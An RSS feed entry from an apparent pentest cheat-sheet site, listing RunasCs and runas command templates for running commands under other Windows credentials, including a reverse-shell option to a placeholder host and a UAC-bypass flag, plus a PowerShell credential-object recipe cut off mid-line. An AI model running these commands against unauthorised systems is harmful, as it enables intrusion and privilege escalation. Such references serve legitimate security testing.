channel.title: Credential Object on TLDRBins
channel.description: Recent content in Credential Object on TLDRBins

item.title: Runas
item.description: RunasCS .\RunasCs.exe '<USER>' '<PASSWORD>' "<CMD>" -r <LOCAL_IP>:<LOCAL_PORT> .\RunasCs.exe '<USER>' '<PASSWORD>' "<CMD>" -l <LOGON_TYPE> # Or .\RunasCs.exe '<USER>' '<PASSWORD>' --bypass-uac "<CMD>" -l <LOGON_TYPE> LOGON TYPE --------------------- 2 Interactive 3 Network 4 Batch 5 Service 7 Unlock 8 NetworkCleartext 9 NewCredentials 10 RemoteInteractive 11 CachedInteractive Ref: RunasCS Runas (With Password) runas /user:'<USER>' "<CMD>" runas /user:'admin' "powershell" Runas (With Cred Object) 1. Create Credential Object Method 1 Method 2 $username = '<DOMAIN>\<USER>' $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force $cred = New-Object System.
